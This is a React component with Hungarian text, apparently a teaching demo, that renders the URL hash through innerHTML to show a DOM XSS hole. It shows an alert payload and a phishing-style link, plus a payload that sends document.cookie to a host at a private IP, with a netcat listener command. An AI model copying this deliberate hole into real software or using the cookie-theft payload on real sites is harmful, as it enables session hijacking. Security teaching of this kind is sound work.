import React, { useState, useEffect, useRef } from "react";

const funds = [
  { id: "fund1", name: "Globális részvény alap", type: "részvény" },
  { id: "fund2", name: "Fejlődő kötvény alap", type: "kötvény" },
  { id: "fund3", name: "Vegyes kiegyensúlyozott alap", type: "egyéb" },
  { id: "fund4", name: "Technólógiai részvény alap", type: "részvény" },
  { id: "fund5", name: "Vállalati kötvény alap", type: "kötvény" },
  { id: "fund6", name: "Abszolút hozam stratégiai alap", type: "egyéb" },
  { id: "fund7", name: "ESG részvény alap", type: "részvény" },
];

export default function HashAndRadioFilteredFunds() {
  const [selectedType, setSelectedType] = useState("");
  const unsafeRef = useRef(null); // ⚠️ For unsafe hash display

  useEffect(() => {
    const updateFromHash = () => {
      const hash = decodeURIComponent(window.location.hash.replace("#", ""));
      setSelectedType(hash);

      // ⚠️ INSECURE: Injecting directly into the DOM
      if (unsafeRef.current) {
        unsafeRef.current.innerHTML = hash;
      }
    };

    updateFromHash();
    window.addEventListener("hashchange", updateFromHash);
    return () => {
      window.removeEventListener("hashchange", updateFromHash);
    };
  }, []);

  const handleChange = (type) => {
    window.location.hash = type;
  };

  const filteredFunds = funds.filter(fund =>
    !selectedType ? true : fund.type === selectedType
  );

  const fundTypes = ["részvény", "kötvény", "egyéb"];

  return (
    <div className="p-4 max-w-md mx-auto">
      <h2 className="text-xl font-bold mb-4">Válasszon befektetési alap típust:</h2>

      <form className="mb-4 space-y-2">
        {fundTypes.map(type => (
          <label key={type} className="block">
            <input
              type="radio"
              name="fundType"
              value={type}
              checked={selectedType === type}
              onChange={() => handleChange(type)}
              className="mr-2"
            />
            {type.charAt(0).toUpperCase() + type.slice(1)}
          </label>
        ))}
        <label className="block">
          <input
            type="radio"
            name="fundType"
            value=""
            checked={selectedType === ""}
            onChange={() => handleChange("")}
            className="mr-2"
          />
          Mind
        </label>
      </form>

      <h3 className="text-lg font-semibold">
        Alap lista<p ref={unsafeRef} />
      </h3>


      

      <ul className="list-disc list-inside">
        {filteredFunds.length > 0 ? (
          filteredFunds.map(fund => (
            <li key={fund.id}>{fund.name}</li>
          ))
        ) : (
          <li className="text-gray-500">Nincs iylen alap</li>
        )}
      </ul>

      <br />
      <p>A DOM XSS példa kipróbáláshoz módosítsd az URL-t például így: </p>
      <code>http://localhost:3000/funds#&lt;img src&#61;x onerror&#61;"alert(document.cookie)"&gt;</code>

      <br /><br />
      <p>Lehetséges kártékony email támadási vektor példa:</p>
      <p>Újonnan indított magas hozamú befektetési alaphainkat itt találja meg!</p>
      <a href="http://localhost:3000/funds#%3Cimg%20src=1%20onerror=%22alert(document.cookie)%22%3E">Befektetési alap lista! Kattintson!</a>

      <br /><br />
      <p>Valós session cookie ellopására alkalmas kód részlet: </p>
      <code>http://localhost:3000/funds#&lt;img src&#61;x onerror&#61;"document.location='http://172.18.193.203:81/?'+document.cookie"&gt;</code>
      <p>A támadó gépen indíts egy Netcat-et: <code>nc -nvlp 81</code></p>

     
        
      </div>

      
   
  );
}